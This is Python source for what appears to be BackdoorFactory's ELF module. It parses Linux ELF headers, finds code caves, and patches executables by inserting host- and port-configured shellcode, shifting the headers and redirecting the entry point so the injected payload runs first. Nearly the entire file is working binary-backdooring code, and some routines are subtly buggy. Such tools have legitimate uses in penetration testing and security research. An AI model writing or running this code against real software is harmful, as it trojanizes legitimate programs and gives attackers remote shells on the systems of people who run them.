#!/usr/bin/env python
'''
    
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.

'''
import struct
import os
import sys
import shutil
#from intelCore import intelCore
from intel.LinuxIntelELF32 import linux_elfI32_shellcode
from intel.LinuxIntelELF64 import linux_elfI64_shellcode



class elf():
    """
    ELF data format class for BackdoorFactory.
    We don't need the ENTIRE format.
    """

    #setting linux header infomation
    e_ident = {"EI_MAG": "\x7f" + "ELF",
                "EI_CLASS": {0x01: "x86",
                             0x02: "x64"
                            },
                "EI_DATA_little": 0x01,
                "EI_DATA_big": 0x02,
                "EI_VERSION": 0x01,
                "EI_OSABI": {0x00: "System V",
                             0x01: "HP-UX",
                             0x02: "NetBSD",
                             0x03: "Linux",
                             0x06: "Solaris",
                             0x07: "AIX",
                             0x08: "IRIX",
                             0x09: "FreeBSD",
                             0x0C: "OpenBSD"
                             }, 
                "EI_ABIVERSION": 0x00,
                "EI_PAD": 0x07
                }

    e_type = {0x01: "relocatable",
              0x02: "executable",
              0x03: "shared",
              0x04: "core"
             }

    e_machine = {0x02: "SPARC",
                 0x03: "x86",
                 0x14: "PowerPC",
                 0x28: "ARM",
                 0x32: "IA-64",
                 0x3E: "x86-64",
                 0xB7: "AArch64"
                }
    e_version = 0x01
#end elf class 


class elfbin():
    """
    This is the class handler for the elf binary format
    """
    def __init__(self, FILE, OUTPUT, SHELL, HOST="127.0.0.1", PORT=8888, 
                 SUPPORT_CHECK=False, FIND_CAVES=False, SHELL_LEN=70,
                 SUPPLIED_SHELLCODE=None):
        #print FILE
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.bin_file = open(self.FILE, "r+b")
        self.SHELL = SHELL
        self.HOST = HOST
        self.PORT = PORT
        self.FIND_CAVES = FIND_CAVES
        self.SUPPORT_CHECK = SUPPORT_CHECK
        self.SHELL_LEN = SHELL_LEN
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.supported_types = {
                                0x00:   #System V 
                                [[0x01, #32bit
                                  0x02  #64bit
                                  ], 
                                 [0x03, #x86
                                  0x3E  #x64
                                  ]],
                                0x03:   #linx 
                                [[0x01, #32bit
                                  0x02  #64bit
                                  ], 
                                 [0x03, #x86
                                  0x3E  #x64
                                  ]],
                            
                        }
        
    def run_this(self):
        '''
        Call this if you want to run the entire process with a ELF binary.
        '''
        #self.print_supported_types()
        if self.FIND_CAVES is True:
            self.support_check()
            self.gather_file_info()
            if self.supported is False:
                print self.FILE, "is not supported."
                sys.exit()
            print ("Looking for caves with a size of %s "
               "bytes (measured as an integer)"
               % self.SHELL_LEN)
            self.find_all_caves()
            sys.exit()
        if self.SUPPORT_CHECK is True:
            if not self.FILE:
                print "You must provide a file to see if it is supported (-f)"
                sys.exit()
            try:
                self.support_check()
            except Exception, e:
                self.supported = False
                print 'Exception:', str(e), '%s' % self.FILE
            if self.supported is False:
                print "%s is not supported." % self.FILE
                self.print_supported_types()
            else:
                print "%s is supported." % self.FILE
            sys.exit(-1)
        
       
        #self.print_section_name()
        
        return self.patch_elf()
        

    def find_all_caves(self):
        """
        This function finds all the codecaves in a inputed file.
        Prints results to screen. Generally not many caves in the ELF
        format.  And why there is no need to cave jump.
        """

        print "[*] Looking for caves"
        SIZE_CAVE_TO_FIND = 94
        BeginCave = 0
        Tracking = 0
        count = 1
        caveTracker = []
        caveSpecs = []
        self.bin_file.seek(0)
        while True:
            try:
                s = struct.unpack("<b", self.bin_file.read(1))[0]
            except:
                break
            if s == 0:
                if count == 1:
                    BeginCave = Tracking
                count += 1
            else:
                if count >= SIZE_CAVE_TO_FIND:
                    caveSpecs.append(BeginCave)
                    caveSpecs.append(Tracking)
                    caveTracker.append(caveSpecs)
                count = 1
                caveSpecs = []

            Tracking += 1
        
        for caves in caveTracker:

            countOfSections = 0
            for section in self.sec_hdr.iteritems():
                #print 'section', section[1]
                section = section[1]
                sectionFound = False
                if caves[0] >= section['sh_offset'] and caves[1] <= (section['sh_size'] + section['sh_offset']) and \
                    caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                    print "We have a winner:", section['name']
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print 'sh_size', hex(section['sh_size'])
                    print 'sh_offset', hex(section['sh_offset'])
                    print 'End of Raw Data:', hex(section['sh_size'] + section['sh_offset'])
                    print '*' * 50
                    sectionFound = True
                    break
            if sectionFound is False:
                try:
                    print "No section"
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print '*' * 50
                except Exception as e:
                    print str(e)
        print "[*] Total of %s caves found" % len(caveTracker)


    def set_shells(self):
        """
        This function sets the shellcode.
        """
        print "[*] Setting selected shellcode"
        if self.EI_CLASS == 0x1 and self.e_machine == 0x03:
            self.bintype = linux_elfI32_shellcode
        if self.EI_CLASS == 0x2 and self.e_machine == 0x3E:
            self.bintype = linux_elfI64_shellcode
        if not self.SHELL:
            print "You must choose a backdoor to add: "
            for item in dir(self.bintype):
                if "__" in item:
                    continue
                elif ("returnshellcode" == item 
                    or "pack_ip_addresses" == item 
                    or "eat_code_caves" == item
                    or 'ones_compliment' == item
                    or 'resume_execution' in item
                    or 'returnshellcode' in item):
                    continue
                else:
                    print "   {0}".format(item)
            sys.exit()
        if self.SHELL not in dir(self.bintype):
            print "The following %ss are available:" % str(self.bintype).split(".")[1]
            for item in dir(self.bintype):
                #print item
                if "__" in item:
                    continue
                elif ("returnshellcode" == item 
                    or "pack_ip_addresses" == item 
                    or "eat_code_caves" == item
                    or 'ones_compliment' == item
                    or 'resume_execution' in item
                    or 'returnshellcode' in item):
                    continue
                else:
                    print "   {0}".format(item)

            sys.exit(-1)
        else:
            shell_cmd = self.SHELL + "()"
        self.shells = self.bintype(self.HOST, self.PORT, self.e_entry, self.SUPPLIED_SHELLCODE)
        self.allshells = getattr(self.shells, self.SHELL)(self.e_entry)
        self.shellcode = self.shells.returnshellcode()


    def print_supported_types(self):
        """
        Prints supported types
        """
        print "Supported system types:"
        for system_type in self.supported_types.iteritems():
            print "    ",elf.e_ident["EI_OSABI"][system_type[0]]
            print "     Arch type:"
            for class_type in system_type[1][0]:
                print "\t", elf.e_ident['EI_CLASS'][class_type]
            print "     Chip set:"
            for e_mach_type in system_type[1][1]:
                print "\t", elf.e_machine[e_mach_type]
            #print "Supported class types:"
            print "*"*25

        
    def support_check(self):
        """
        Checks for support
        """
        print "[*] Checking file support" 
        self.bin_file.seek(0)
        if self.bin_file.read(4) == elf.e_ident["EI_MAG"]:
            self.bin_file.seek(5,1)
            sys_type = struct.unpack(">H", self.bin_file.read(2))[0]
            self.supported = False
            for system_type in self.supported_types.iteritems():    
                if sys_type == system_type[0]:
                    print "[*] System Type Supported:", elf.e_ident["EI_OSABI"][system_type[0]]
                    self.supported = True
                    break
        else:
            self.supported = False

            
    def get_section_name(self, section_offset):
        '''
        Get section names
        '''
        self.bin_file.seek(self.sec_hdr[self.e_shstrndx]['sh_offset']+section_offset,0)
        name = ''
        j = ''
        while True:
            j = self.bin_file.read(1)
            if hex(ord(j)) == '0x0':
                break
            else:
                name += j
        #print "name:", name

    
    def set_section_name(self):
        '''
        Set the section names
        '''
        #print "self.s_shstrndx", self.e_shstrndx
         #how to find name section specifically
        for i in range(0, self.e_shstrndx+1):
            self.sec_hdr[i]['name'] = self.get_section_name(self.sec_hdr[i]['sh_name'])
            if self.sec_hdr[i]['name'] == ".text":
                #print "Found text section"
                self.text_section =  i
        
    
    def gather_file_info(self):
        '''
        Gather info about the binary
        '''
        print "[*] Gathering file info"
        bin = self.bin_file
        bin.seek(0)
        EI_MAG = bin.read(4)
        self.EI_CLASS = struct.unpack("<B", bin.read(1))[0]
        self.EI_DATA = struct.unpack("<B", bin.read(1))[0]
        if self.EI_DATA == 0x01:
            #little endian
            self.endian = "<"
        else:
            #big self.endian
            self.endian = ">"
        self.EI_VERSION = bin.read(1)
        self.EI_OSABI = bin.read(1)
        self.EI_ABIVERSION = bin.read(1)
        self.EI_PAD = struct.unpack("<BBBBBBB", bin.read(7))[0]
        self.e_type = struct.unpack("<H", bin.read(2))[0]
        self.e_machine = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_version = struct.unpack(self.endian + "I", bin.read(4))[0]
        #print "EI_Class", self.EI_CLASS
        if self.EI_CLASS == 0x01:
            #print "32 bit D:"
            self.e_entryLocOnDisk = bin.tell()
            self.e_entry = struct.unpack(self.endian + "I", bin.read(4))[0]
            #print hex(self.e_entry)
            self.e_phoff = struct.unpack(self.endian + "I", bin.read(4))[0]
            self.e_shoff = struct.unpack(self.endian + "I", bin.read(4))[0]
        else:
            #print "64 bit B:"
            self.e_entryLocOnDisk = bin.tell()
            self.e_entry = struct.unpack(self.endian + "Q", bin.read(8))[0]
            self.e_phoff = struct.unpack(self.endian + "Q", bin.read(8))[0]
            self.e_shoff = struct.unpack(self.endian + "Q", bin.read(8))[0]
        #print hex(self.e_entry)
        #print "e_phoff", self.e_phoff
        #print "e_shoff", self.e_shoff
        self.VrtStrtngPnt = self.e_entry
        self.e_flags = struct.unpack(self.endian + "I", bin.read(4))[0]
        self.e_ehsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_phentsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_phnum = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shentsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shnum = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shstrndx = struct.unpack(self.endian + "H", bin.read(2))[0]
        #self.e_version'] = struct.e_entry
        #section tables
        bin.seek(self.e_phoff,0)
        #header tables
        if self.e_shnum == 0:
            print "more than 0xFF00 sections, wtf?"
            #print "real number of section header table entries"
            #print "in sh_size."
            self.real_num_sections = self.sh_size
        else:
            #print "less than 0xFF00 sections, yay"
            self.real_num_sections = self.e_shnum
        #print "real_num_sections", self.real_num_sections

        bin.seek(self.e_phoff,0)
        self.prog_hdr = {}
        #print 'e_phnum', self.e_phnum
        for i in range(self.e_phnum):
            #print "i check e_phnum", i
            self.prog_hdr[i] = {}
            if self.EI_CLASS == 0x01:
                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + "I", bin.read(4))[0]
            else:
                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
            if self.prog_hdr[i]['p_type'] == 0x1 and self.prog_hdr[i]['p_vaddr'] < self.e_entry:
                self.offset_addr = self.prog_hdr[i]['p_vaddr'] 
                self.LocOfEntryinCode = self.e_entry - self.offset_addr
                #print "found the entry offset"

        bin.seek(self.e_shoff, 0)
        self.sec_hdr = {}
        for i in range(self.e_shnum):
            self.sec_hdr[i] = {}
            if self.EI_CLASS == 0x01:
                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                #print self.sec_hdr[i]['sh_name']
                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + "I", bin.read(4))[0]
            else:
                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
        #bin.seek(self.sec_hdr'][self.e_shstrndx']]['sh_offset'], 0)
        self.set_section_name()
        if self.e_type != 0x2:
            print "[!] Only supporting executable elf e_types, things may get wierd."
    
    
    def output_options(self):
        """
        Output file check.
        """
        if not self.OUTPUT:
            self.OUTPUT = os.path.basename(self.FILE)

    def patch_elf(self):
        '''
        Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
        6. Increase p_shoff by PAGE_SIZE in the ELF header
        7. Patch the insertion code (parasite) to jump to the entry point (original)
        1. Locate the text segment program header
            -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
            -Increase p_filesz by account for the new code (parasite)
            -Increase p_memsz to account for the new code (parasite)
        2. For each phdr who's segment is after the insertion (text segment)
            -increase p_offset by PAGE_SIZE
        3. For the last shdr in the text segment
            -increase sh_len by the parasite length
        4. For each shdr who's section resides after the insertion
            -Increase sh_offset by PAGE_SIZE
        5. Physically insert the new code (parasite) and pad to PAGE_SIZE, 
            into the file - text segment p_offset + p_filesz (original)
        '''
        self.support_check()
        if self.supported is False:
            "ELF Binary not supported"
            sys.exit(-1)
        
        self.output_options()

        if not os.path.exists("backdoored"):
            os.makedirs("backdoored")
        os_name = os.name
        if os_name == 'nt':
            self.backdoorfile = "backdoored\\" + self.OUTPUT
        else:
            self.backdoorfile = "backdoored/" +  self.OUTPUT

        shutil.copy2(self.FILE, self.backdoorfile)

        self.gather_file_info()
        self.set_shells()
        print "[*] Patching Binary"
        self.bin_file = open(self.backdoorfile, "r+b")
        
        shellcode = self.shellcode
        
        newBuffer = len(shellcode)
        
        self.bin_file.seek(24, 0)
    
        sh_addr = 0x0
        offsetHold = 0x0
        sizeOfSegment = 0x0 
        shellcode_vaddr = 0x0
        headerTracker = 0x0
        PAGE_SIZE = 4096
        #find range of the first PT_LOAD section
        for header, values in self.prog_hdr.iteritems():
            #print 'program header', header, values
            if values['p_flags'] == 0x5 and values['p_type'] == 0x1:
                #print "Found text segment"
                shellcode_vaddr = values['p_vaddr'] + values['p_filesz']
                beginOfSegment = values['p_vaddr']
                oldentry = self.e_entry
                sizeOfNewSegment = values['p_memsz'] + newBuffer
                LOCofNewSegment = values['p_filesz'] + newBuffer
                headerTracker = header
                newOffset = values['p_offset'] + values['p_filesz']
        
        #SPLIT THE FILE
        self.bin_file.seek(0)
        file_1st_part = self.bin_file.read(newOffset)
        #print file_1st_part.encode('hex')
        newSectionOffset = self.bin_file.tell()
        file_2nd_part = self.bin_file.read()

        self.bin_file.close()
        #print "Reopen file for adjustments"
        self.bin_file = open(self.backdoorfile, "w+b")
        self.bin_file.write(file_1st_part)
        self.bin_file.write(shellcode)
        self.bin_file.write("\x00" * (PAGE_SIZE - len(shellcode)))
        self.bin_file.write(file_2nd_part)
        if self.EI_CLASS == 0x01:
            #32 bit FILE
            #update section header table
            self.bin_file.seek(24, 0)
            self.bin_file.seek(8, 1)
            self.bin_file.write(struct.pack(self.endian + "I", self.e_shoff + PAGE_SIZE))
            self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)
            for i in range(self.e_shnum):
                #print "i", i, self.sec_hdr[i]['sh_offset'], newOffset
                if self.sec_hdr[i]['sh_offset'] >= newOffset:
                    #print "Adding page size"
                    self.bin_file.seek(16, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                    self.bin_file.seek(20, 1)
                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == shellcode_vaddr:
                    #print "adding newBuffer size"
                    self.bin_file.seek(20, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_size'] + newBuffer))
                    self.bin_file.seek(16, 1)
                else:
                    self.bin_file.seek(40,1)
            #update the pointer to the section header table
            after_textSegment = False
            self.bin_file.seek(self.e_phoff,0)
            for i in range(self.e_phnum):
                #print "header range i", i
                #print "shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(shellcode_vaddr)
                if i == headerTracker:
                    #print "Found Text Segment again"
                    after_textSegment = True
                    self.bin_file.seek(16, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_filesz'] + newBuffer))
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_memsz'] + newBuffer))
                    self.bin_file.seek(8, 1)
                elif after_textSegment is True:
                    #print "Increasing headers after the addition"
                    self.bin_file.seek(4, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                    self.bin_file.seek(24, 1)
                else:
                    self.bin_file.seek(32,1)

            self.bin_file.seek(self.e_entryLocOnDisk, 0)
            self.bin_file.write(struct.pack(self.endian + "I", shellcode_vaddr))
           
            self.JMPtoCodeAddress = shellcode_vaddr - self.e_entry -5
           
        else:
            #64 bit FILE
            self.bin_file.seek(24, 0)
            self.bin_file.seek(16, 1)
            self.bin_file.write(struct.pack(self.endian + "I", self.e_shoff + PAGE_SIZE))
            self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)
            for i in range(self.e_shnum):
                #print "i", i, self.sec_hdr[i]['sh_offset'], newOffset
                if self.sec_hdr[i]['sh_offset'] >= newOffset:
                    #print "Adding page size"
                    self.bin_file.seek(24, 1)
                    self.bin_file.write(struct.pack(self.endian + "Q", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                    self.bin_file.seek(32, 1)
                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == shellcode_vaddr:
                    #print "adding newBuffer size"
                    self.bin_file.seek(32, 1)
                    self.bin_file.write(struct.pack(self.endian + "Q", self.sec_hdr[i]['sh_size'] + newBuffer))
                    self.bin_file.seek(24, 1)
                else:
                    self.bin_file.seek(64,1)
            #update the pointer to the section header table
            after_textSegment = False
            self.bin_file.seek(self.e_phoff,0)
            for i in range(self.e_phnum):
                #print "header range i", i
                #print "shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(shellcode_vaddr)
                if i == headerTracker:
                    #print "Found Text Segment again"
                    after_textSegment = True
                    self.bin_file.seek(32, 1)
                    self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_filesz'] + newBuffer))
                    self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_memsz'] + newBuffer))
                    self.bin_file.seek(8, 1)
                elif after_textSegment is True:
                    #print "Increasing headers after the addition"
                    self.bin_file.seek(8, 1)
                    self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                    self.bin_file.seek(40, 1)
                else:
                    self.bin_file.seek(56,1)

            self.bin_file.seek(self.e_entryLocOnDisk, 0)
            self.bin_file.write(struct.pack(self.endian + "Q", shellcode_vaddr))
           
            self.JMPtoCodeAddress = shellcode_vaddr - self.e_entry -5    

        self.bin_file.close()
        print "[!] Patching Complete"
        return True

# END elfbin clas

def main(): 
    if len(sys.argv) != 5:
        print "Usage:", sys.argv[0], "FILE shellcode HOST PORT"
        sys.exit()
    supported_file = elfbin(sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4]))
    Result = supported_file.run_this()
    
if __name__ == "__main__":
    main()